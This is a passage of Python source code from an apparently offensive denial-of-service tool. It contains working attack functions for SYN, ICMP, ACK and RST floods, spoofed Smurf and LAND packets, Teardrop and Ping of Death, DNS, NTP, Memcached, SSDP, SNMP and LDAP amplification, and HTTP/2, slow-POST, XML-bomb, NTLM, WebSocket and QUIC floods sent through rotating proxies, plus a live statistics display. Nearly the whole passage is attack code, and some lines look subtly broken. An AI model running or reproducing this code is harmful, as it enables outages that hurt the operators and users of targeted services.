                        logger.debug(f"Unexpected error during Slowloris (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)

def syn_flood(target_ip: str, target_port: int, duration: int, random_ports: bool = False) -> None:
    """Perform SYN flood attack with improved packet generation."""
    if not check_root():
        print(f"{RED}SYN flood requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            sport = random.randint(1024, 65535) if random_ports else target_port
            ip_layer = scapy.IP(dst=target_ip, id=random.randint(1, 65535), ttl=random.randint(30, 255))
            tcp_layer = scapy.TCP(sport=sport, dport=target_port, flags="S", seq=random.randint(1, 4294967295))
            packet = ip_layer / tcp_layer
            scapy.send(packet, verbose=False, inter=0.001)
    except Exception as e:
        logger.error(f"Error during SYN flood: {e}")
    finally:
        print(f"{GREEN}SYN flood attack completed.{RESET}")

def icmp_flood(target_ip: str, duration: int, payload_size: int = 1024) -> None:
    """Perform ICMP ping flood attack with variable payload size."""
    if not check_root():
        print(f"{RED}ICMP flood requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting ICMP flood attack on {target_ip} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            payload = os.urandom(min(payload_size, 65500))
            packet = scapy.IP(dst=target_ip, id=random.randint(1, 65535)) / \
                     scapy.ICMP() / payload
            scapy.send(packet, verbose=False, inter=0.001)
    except Exception as e:
        logger.error(f"Error during ICMP flood: {e}")
    finally:
        print(f"{GREEN}ICMP flood attack completed.{RESET}")

async def dns_amplification(target_ip: str, duration: int) -> None:
    """Perform DNS amplification attack with multiple query types."""
    if not check_root():
        print(f"{RED}DNS amplification requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting DNS amplification attack on {target_ip} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        query_types = ["ANY", "MX", "TXT", "AAAA"]
        while time.time() - start_time < duration and not stop_event.is_set():
            query_type = random.choice(query_types)
            packet = scapy.IP(dst=target_ip) / \
                     scapy.UDP(sport=random.randint(1024, 65535), dport=53) / \
                     scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com", qtype=query_type))
            scapy.send(packet, verbose=False, inter=0.001)
    except Exception as e:
        logger.error(f"Error during DNS amplification: {e}")
    finally:
        print(f"{GREEN}DNS amplification attack completed.{RESET}")

def ftp_flood(target_ip: str, target_port: int, duration: int, payload_size: int = 1024) -> None:
    """Perform an FTP flood attack with improved connection management."""
    print(f"{GREEN}Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                
                # Send random FTP commands
                commands = [
                    "USER anonymous\r\n",
                    "PASS anonymous@example.com\r\n",
                    "LIST\r\n",
                    "RETR file.txt\r\n",
                    "STOR file.txt\r\n"
                ]
                
                for cmd in commands:
                    sock.send(cmd.encode())
                    time.sleep(0.1)
                
                # Send random data
                sock.send(os.urandom(payload_size))
                sock.close()
            except socket.error:
                pass
            time.sleep(0.01)
    except Exception as e:
        logger.error(f"Error during FTP flood: {e}")
    finally:
        print(f"{GREEN}FTP flood attack completed.{RESET}")

def ssh_flood(target_ip: str, target_port: int, duration: int, payload_size: int = 1024) -> None:
    """Perform an SSH flood attack with improved connection management."""
    print(f"{GREEN}Starting SSH flood attack on {target_ip}:{target_port} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                
                # Send SSH version string
                sock.send(b"SSH-2.0-OpenSSH_7.9p1\r\n")
                
                # Send random data
                sock.send(os.urandom(payload_size))
                sock.close()
            except socket.error:
                pass
            time.sleep(0.01)
    except Exception as e:
        logger.error(f"Error during SSH flood: {e}")
    finally:
        print(f"{GREEN}SSH flood attack completed.{RESET}")

def ntp_amplification(target_ip: str, duration: int) -> None:
    """Perform NTP amplification attack with MONLIST queries."""
    if not check_root():
        print(f"{RED}NTP amplification requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting NTP amplification attack on {target_ip} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            # MONLIST query
            monlist_packet = (
                b'\x17\x00\x03\x2a' +  # NTP v2, MON_GETLIST
                b'\x00' * 40
            )
            
            packet = scapy.IP(dst=target_ip) / \
                     scapy.UDP(sport=random.randint(1024, 65535), dport=123) / \
                     scapy.Raw(load=monlist_packet)
            
            scapy.send(packet, verbose=False, inter=0.001)
    except Exception as e:
        logger.error(f"Error during NTP amplification: {e}")
    finally:
        print(f"{GREEN}NTP amplification attack completed.{RESET}")

def memcached_amplification(target_ip: str, duration: int) -> None:
    """Perform Memcached amplification attack with large get requests."""
    if not check_root():
        print(f"{RED}Memcached amplification requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting Memcached amplification attack on {target_ip} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            # Large get request
            get_packet = b"get aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n"
            
            packet = scapy.IP(dst=target_ip) / \
                     scapy.UDP(sport=random.randint(1024, 65535), dport=11211) / \
                     scapy.Raw(load=get_packet)
            
            scapy.send(packet, verbose=False, inter=0.001)
    except Exception as e:
        logger.error(f"Error during Memcached amplification: {e}")
    finally:
        print(f"{GREEN}Memcached amplification attack completed.{RESET}")

def smurf_attack(target_ip: str, duration: int) -> None:
    """Perform Smurf attack with improved packet generation."""
    if not check_root():
        print(f"{RED}Smurf attack requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting Smurf attack on {target_ip} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            packet = scapy.IP(src=target_ip, dst="255.255.255.255") / \
                     scapy.ICMP()
            scapy.send(packet, verbose=False, inter=0.001)
    except Exception as e:
        logger.error(f"Error during Smurf attack: {e}")
    finally:
        print(f"{GREEN}Smurf attack completed.{RESET}")

def teardrop_attack(target_ip: str, duration: int) -> None:
    """Perform Teardrop attack with improved packet generation."""
    if not check_root():
        print(f"{RED}Teardrop attack requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting Teardrop attack on {target_ip} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            # First fragment (offset 0, more fragments)
            packet1 = scapy.IP(dst=target_ip, flags="MF", frag=0, id=random.randint(1, 65535)) / \
                      scapy.UDP() / ("X" * 64)
            
            # Second fragment (overlapping offset)
            packet2 = scapy.IP(dst=target_ip, flags=0, frag=1, id=packet1.id) / \
                      ("X" * 64)
            
            scapy.send(packet1, verbose=False)
            scapy.send(packet2, verbose=False)
            time.sleep(0.01)
    except Exception as e:
        logger.error(f"Error during Teardrop attack: {e}")
    finally:
        print(f"{GREEN}Teardrop attack completed.{RESET}")

async def http2_flood(target_url: str, stop_event: threading.Event, pause_time: float, 
                     rate_limit: int, proxies: Optional[List[str]] = None, 
                     headers: Optional[Dict[str, str]] = None, payload_type: str = "json", 
                     retry: int = 3, payload_size: int = 1024) -> None:
    """Perform HTTP/2 flood attack with improved connection management."""
    global requests_sent, successful_requests, failed_requests
    
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"https://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {
                            "User-Agent": random.choice(USER_AGENTS),
                            "Accept": "*/*",
                            "Accept-Encoding": "gzip, deflate, br",
                            "Accept-Language": "en-US,en;q=0.9",
                            "Cache-Control": "no-cache",
                            "Connection": "keep-alive",
                            "Pragma": "no-cache"
                        }
                        
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type, payload_size) if method in ["POST", "PUT", "PATCH"] else None

                        proxy = next(proxy_pool) if proxy_pool else None
                        
                        # Force HTTP/2
                        connector = aiohttp.TCPConnector(force_close=True, enable_cleanup_closed=True)
                        async with aiohttp.ClientSession(connector=connector) as h2_session:
                            async with h2_session.request(
                                method, target_url,
                                headers=headers,
                                proxy=proxy,
                                data=payload,
                                timeout=aiohttp.ClientTimeout(total=5)
                            ) as response:
                                with requests_lock:
                                    requests_sent += 1
                                    if response.status in [200, 201, 204]:
                                        successful_requests += 1
                                    else:
                                        failed_requests += 1
                                await response.read()
                        break
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logger.debug(f"Client error during HTTP/2 flood (attempt {attempt + 1}): {e}")
                        await asyncio.sleep(2 ** attempt)
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logger.debug(f"Unexpected error during HTTP/2 flood (attempt {attempt + 1}): {e}")
                        await asyncio.sleep(2 ** attempt)
                await asyncio.sleep(pause_time)

def land_attack(target_ip: str, target_port: int, duration: int) -> None:
    """LAND attack (send packets with source=dest) with improved packet generation."""
    if not check_root():
        print(f"{RED}LAND attack requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting LAND attack on {target_ip}:{target_port} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            packet = scapy.IP(src=target_ip, dst=target_ip) / \
                     scapy.TCP(sport=target_port, dport=target_port, flags="S", seq=random.randint(1, 4294967295))
            scapy.send(packet, verbose=False, inter=0.001)
    except Exception as e:
        logger.error(f"Error during LAND attack: {e}")
    finally:
        print(f"{GREEN}LAND attack completed.{RESET}")

def ping_of_death(target_ip: str, duration: int) -> None:
    """Ping of Death attack with oversized packets and improved packet generation."""
    if not check_root():
        print(f"{RED}Ping of Death requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting Ping of Death attack on {target_ip} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            # Create fragmented oversized packet
            packet = scapy.IP(dst=target_ip, flags="MF", frag=0, id=random.randint(1, 65535)) / \
                     scapy.ICMP() / \
                     ("X" * 65500)
            scapy.send(packet, verbose=False, inter=0.1)
    except Exception as e:
        logger.error(f"Error during Ping of Death: {e}")
    finally:
        print(f"{GREEN}Ping of Death attack completed.{RESET}")

async def slow_post_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                          rate_limit: int, proxies: Optional[List[str]] = None, 
                          payload_size: int = 1024) -> None:
    """Slow POST attack with chunked transfer encoding and improved connection management."""
    global requests_sent, successful_requests, failed_requests
    
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "Transfer-Encoding": "chunked",
        "Connection": "keep-alive"
    }

    async def generate_chunked_data() -> bytes:
        """Generate chunked data with random delays."""
        # Send small chunks with random delays
        for _ in range(10):
            chunk_size = random.randint(1, 10)
            yield f"{chunk_size}\r\n".encode() + os.urandom(chunk_size) + b"\r\n"
            await asyncio.sleep(random.uniform(1, 5))
        
        # Final chunk
        yield b"0\r\n\r\n"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    proxy = next(proxy_pool) if proxy_pool else None
                    
                    # Use custom connector to prevent connection pooling
                    connector = aiohttp.TCPConnector(force_close=True)
                    async with aiohttp.ClientSession(connector=connector) as slow_session:
                        async with slow_session.post(
                            target_url,
                            headers=headers,
                            proxy=proxy,
                            data=generate_chunked_data(),
                            timeout=aiohttp.ClientTimeout(total=30)
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                            await response.read()
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.debug(f"Error during slow POST attack: {e}")
                await asyncio.sleep(pause_time)

async def xml_bomb_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                         rate_limit: int, proxies: Optional[List[str]] = None) -> None:
    """XML Bomb (Billion Laughs) attack with improved payload generation."""
    global requests_sent, successful_requests, failed_requests
    
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    # Generate XML bomb with more entities for larger expansion
    xml_bomb = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/xml",
        "Accept": "application/xml",
        "Connection": "keep-alive"
    }

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    proxy = next(proxy_pool) if proxy_pool else None
                    
                    # Use custom connector to prevent connection pooling
                    connector = aiohttp.TCPConnector(force_close=True)
                    async with aiohttp.ClientSession(connector=connector) as xml_session:
                        async with xml_session.post(
                            target_url,
                            headers=headers,
                            proxy=proxy,
                            data=xml_bomb,
                            timeout=aiohttp.ClientTimeout(total=30)
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                            await response.read()
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.debug(f"Error during XML bomb attack: {e}")
                await asyncio.sleep(pause_time)

async def ntlm_auth_flood(target_url: str, stop_event: threading.Event, pause_time: float, 
                         rate_limit: int, proxies: Optional[List[str]] = None) -> None:
    """NTLM authentication flood attack with improved connection management."""
    global requests_sent, successful_requests, failed_requests
    
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Authorization": "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    proxy = next(proxy_pool) if proxy_pool else None
                    
                    # Use custom connector to prevent connection pooling
                    connector = aiohttp.TCPConnector(force_close=True)
                    async with aiohttp.ClientSession(connector=connector) as ntlm_session:
                        async with ntlm_session.get(
                            target_url,
                            headers=headers,
                            proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status == 401:  # Expecting authentication challenge
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                            await response.read()
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.debug(f"Error during NTLM auth flood: {e}")
                await asyncio.sleep(pause_time)

def char_gen_flood(target_ip: str, target_port: int, duration: int) -> None:
    """Character generator protocol flood attack with improved packet generation."""
    print(f"{GREEN}Starting CHAR-GEN flood attack on {target_ip}:{target_port} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                # Send CHAR-GEN request
                sock.sendto(b"\x01", (target_ip, target_port))
                
                # Also send some random data
                sock.sendto(os.urandom(1024), (target_ip, target_port))
            time.sleep(0.01)
    except Exception as e:
        logger.error(f"Error during CHAR-GEN flood: {e}")
    finally:
        print(f"{GREEN}CHAR-GEN flood attack completed.{RESET}")

def rst_flood(target_ip: str, target_port: int, duration: int, random_ports: bool = False) -> None:
    """TCP RST flood attack with improved packet generation."""
    if not check_root():
        print(f"{RED}RST flood requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting RST flood attack on {target_ip}:{target_port} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            sport = random.randint(1024, 65535) if random_ports else target_port
            packet = scapy.IP(dst=target_ip, id=random.randint(1, 65535)) / \
                     scapy.TCP(sport=sport, dport=target_port, flags="R", seq=random.randint(1, 4294967295))
            scapy.send(packet, verbose=False, inter=0.001)
    except Exception as e:
        logger.error(f"Error during RST flood: {e}")
    finally:
        print(f"{GREEN}RST flood attack completed.{RESET}")

def ack_flood(target_ip: str, target_port: int, duration: int, random_ports: bool = False) -> None:
    """TCP ACK flood attack with improved packet generation."""
    if not check_root():
        print(f"{RED}ACK flood requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting ACK flood attack on {target_ip}:{target_port} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            sport = random.randint(1024, 65535) if random_ports else target_port
            packet = scapy.IP(dst=target_ip, id=random.randint(1, 65535)) / \
                     scapy.TCP(sport=sport, dport=target_port, flags="A", seq=random.randint(1, 4294967295))
            scapy.send(packet, verbose=False, inter=0.001)
    except Exception as e:
        logger.error(f"Error during ACK flood: {e}")
    finally:
        print(f"{GREEN}ACK flood attack completed.{RESET}")

async def http_fragmentation_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                                   rate_limit: int, proxies: Optional[List[str]] = None) -> None:
    """HTTP packet fragmentation attack with improved packet generation."""
    global requests_sent, successful_requests, failed_requests
    
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    proxy = next(proxy_pool) if proxy_pool else None
                    
                    # First send partial headers
                    partial_headers = "\r\n".join(f"{k}: {v}" for k, v in headers.items()[:3]) + "\r\n"
                    
                    # Create raw socket to send fragmented packets
                    try:
                        parsed_url = urlparse(target_url)
                        target_ip = await resolve_target(target_url)
                        if not target_ip:
                            continue
                            
                        port = parsed_url.port or 80
                        
                        # Create TCP socket
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        sock.connect((target_ip, port))
                        
                        # Send partial request
                        sock.send(f"GET {parsed_url.path or '/'} HTTP/1.1\r\n".encode())
                        sock.send(partial_headers.encode())
                        
                        # Wait before sending rest
                        time.sleep(5)
                        
                        # Send remaining headers
                        remaining_headers = "\r\n".join(f"{k}: {v}" for k, v in headers.items()[3:]) + "\r\n\r\n"
                        sock.send(remaining_headers.encode())
                        
                        # Read response (if any)
                        try:
                            response = sock.recv(1024)
                            if response:
                                with requests_lock:
                                    requests_sent += 1
                                    if b"200 OK" in response:
                                        successful_requests += 1
                                    else:
                                        failed_requests += 1
                        except socket.timeout:
                            with requests_lock:
                                requests_sent += 1
                                successful_requests += 1
                        
                        sock.close()
                    except Exception as e:
                        logger.debug(f"Socket error during fragmentation attack: {e}")
                        with requests_lock:
                            failed_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.debug(f"Error during HTTP fragmentation attack: {e}")
                await asyncio.sleep(pause_time)

async def ws_dos_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                       rate_limit: int, proxies: Optional[List[str]] = None) -> None:
    """WebSocket denial of service attack with improved connection management."""
    global requests_sent, successful_requests, failed_requests
    
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("ws://", "wss://", "http://", "https://")):
        target_url = f"ws://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    proxy = next(proxy_pool) if proxy_pool else None
                    
                    # Use custom connector to prevent connection pooling
                    connector = aiohttp.TCPConnector(force_close=True)
                    async with aiohttp.ClientSession(connector=connector) as ws_session:
                        async with ws_session.ws_connect(
                            target_url,
                            proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as ws:
                            # Send large amounts of data or keep connection open
                            for i in range(1000):
                                await ws.send_str("A" * 1024)
                                await asyncio.sleep(0.1)
                            
                            with requests_lock:
                                requests_sent += 1
                                successful_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.debug(f"Error during WebSocket DoS: {e}")
                await asyncio.sleep(pause_time)

async def quic_flood(target_url: str, stop_event: threading.Event, pause_time: float, 
                    rate_limit: int, proxies: Optional[List[str]] = None) -> None:
    """QUIC protocol flood attack with improved connection management."""
    global requests_sent, successful_requests, failed_requests
    
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("https://")):
        target_url = f"https://{target_url}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    proxy = next(proxy_pool) if proxy_pool else None
                    
                    # Force QUIC by using HTTP/3
                    connector = aiohttp.TCPConnector(force_close=True, enable_cleanup_closed=True)
                    async with aiohttp.ClientSession(connector=connector) as quic_session:
                        async with quic_session.get(
                            target_url,
                            headers=headers,
                            proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                            await response.read()
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.debug(f"Error during QUIC flood: {e}")
                await asyncio.sleep(pause_time)

def ssdp_amplification(target_ip: str, duration: int) -> None:
    """SSDP amplification attack."""
    if not check_root():
        print(f"{RED}SSDP amplification requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting SSDP amplification attack on {target_ip} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            # SSDP M-SEARCH request
            ssdp_packet = (
                b"M-SEARCH * HTTP/1.1\r\n"
                b"HOST: 239.255.255.250:1900\r\n"
                b"MAN: \"ssdp:discover\"\r\n"
                b"MX: 1\r\n"
                b"ST: upnp:rootdevice\r\n"
                b"\r\n"
            )
            
            packet = scapy.IP(dst=target_ip) / \
                     scapy.UDP(sport=random.randint(1024, 65535), dport=1900) / \
                     scapy.Raw(load=ssdp_packet)
            
            scapy.send(packet, verbose=False, inter=0.001)
    except Exception as e:
        logger.error(f"Error during SSDP amplification: {e}")
    finally:
        print(f"{GREEN}SSDP amplification attack completed.{RESET}")

def snmp_amplification(target_ip: str, duration: int) -> None:
    """SNMP amplification attack."""
    if not check_root():
        print(f"{RED}SNMP amplification requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting SNMP amplification attack on {target_ip} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            # SNMP GETBULK request
            snmp_packet = (
                b"\x30\x27\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x1a"
                b"\x02\x04\x7a\x69\x7a\x69\x02\x01\x00\x02\x01\x0a\x30\x0c\x30"
                b"\x0a\x06\x06\x2b\x06\x01\x02\x01\x01\x05\x00"
            )
            
            packet = scapy.IP(dst=target_ip) / \
                     scapy.UDP(sport=random.randint(1024, 65535), dport=161) / \
                     scapy.Raw(load=snmp_packet)
            
            scapy.send(packet, verbose=False, inter=0.001)
    except Exception as e:
        logger.error(f"Error during SNMP amplification: {e}")
    finally:
        print(f"{GREEN}SNMP amplification attack completed.{RESET}")

def ldap_amplification(target_ip: str, duration: int) -> None:
    """LDAP amplification attack."""
    if not check_root():
        print(f"{RED}LDAP amplification requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting LDAP amplification attack on {target_ip} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            # LDAP search request
            ldap_packet = (
                b"\x30\x84\x00\x00\x00\x2d\x02\x01\x01\x63\x84\x00\x00\x00\x24"
                b"\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01"
                b"\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73"
                b"\x30\x84\x00\x00\x00\x00"
            )
            
            packet = scapy.IP(dst=target_ip) / \
                     scapy.UDP(sport=random.randint(1024, 65535), dport=389) / \
                     scapy.Raw(load=ldap_packet)
            
            scapy.send(packet, verbose=False, inter=0.001)
    except Exception as e:
        logger.error(f"Error during LDAP amplification: {e}")
    finally:
        print(f"{GREEN}LDAP amplification attack completed.{RESET}")

def display_status(stop_event: threading.Event, duration: int, results_file: Optional[str] = None) -> AttackStats:
    """Display real-time attack statistics and save results."""
    start_time = time.time()
    results = []
    cpu_usage = []
    mem_usage = []
    network_usage = []
    
    with tqdm(total=duration, desc="Attack Progress", unit="s") as pbar:
        while not stop_event.is_set():
            elapsed = time.time() - start_time
            if elapsed >= duration:
                break
                
            with requests_lock:
                current_time = time.time()
                time_elapsed = max(1, current_time - start_time)
                rps = requests_sent / time_elapsed
                rps_history.append(rps)
                
                # Get system stats
                cpu = psutil.cpu_percent()
                mem = psutil.virtual_memory().percent
                net = psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv
                
                cpu_usage.append(cpu)
                mem_usage.append(mem)
                network_usage.append(net)
                
                stats = {
                    "time": elapsed,
                    "requests_sent": requests_sent,
                    "successful_requests": successful_requests,
                    "failed_requests": failed_requests,
                    "rps": rps,
                    "cpu_usage": cpu,
                    "memory_usage": mem,
                    "network_usage": net,
                }
                results.append(stats)
                
                # Display stats
                status_msg = (
                    f"{GREEN}Elapsed: {elapsed:.1f}s | "
                    f"Requests: {requests_sent} | "
                    f"Success: {successful_requests} | "
                    f"Failed: {failed_requests} | "
                    f"RPS: {rps:.2f} | "
                    f"CPU: {cpu}% | "
                    f"Mem: {mem}% | "
                    f"Net: {net / 1024:.1f}KB{RESET}"
                )
                print(status_msg)
                
            pbar.update(1)
            time.sleep(1)

    # Calculate final stats
    min_rps = min(rps_history) if rps_history else 0
    max_rps = max(rps_history) if rps_history else 0
    avg_rps = sum(rps_history) / len(rps_history) if rps_history else 0
    
    attack_stats = AttackStats(
        start_time=start_time,
        end_time=time.time(),
        requests_sent=requests_sent,
        successful_requests=successful_requests,
        failed_requests=failed_requests,
        min_rps=min_rps,
        max_rps=max_rps,
        avg_rps=avg_rps,
        cpu_usage=cpu_usage,
        mem_usage=mem_usage,
        network_usage=network_usage
    )

    if results_file:
        try:
            with open(results_file, "w") as f:
                json.dump({
                    "stats": results,
                    "summary": {
                        "duration": duration,
                        "total_requests": requests_sent,
                        "success_rate": successful_requests / max(1, requests_sent),
                        "min_rps": min_rps,
                        "max_rps": max_rps,
                        "avg_rps": avg_rps,
                        "avg_cpu": sum(cpu_usage) / max(1, len(cpu_usage)),
                        "avg_mem": sum(mem_usage) / max(1, len(mem_usage)),
                        "total_network": sum(network_usage)
                    }
                }, f, indent=4)
            print(f"{GREEN}Results saved to {results_file}{RESET}")
        except Exception as e:
            logger.error(f"Error saving results: {e}")

    return attack_stats

def simple_status(attack_name: str, target: str, duration: int) -> None:
    """Display simple status for non-HTTP attacks."""
    print(f"{GREEN}Starting {attack_name} on {target} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    with tqdm(total=duration, desc="Attack Progress", unit="s") as pbar:
        while time.time() - start_time < duration and not stop_event.is_set():
            pbar.update(1)
            time.sleep(1)
    
    print(f"{GREEN}{attack_name} completed.{RESET}")

def signal_handler(sig: int, frame: any) -> None:
    """Handle interrupt signals for graceful shutdown."""
    global stop_event
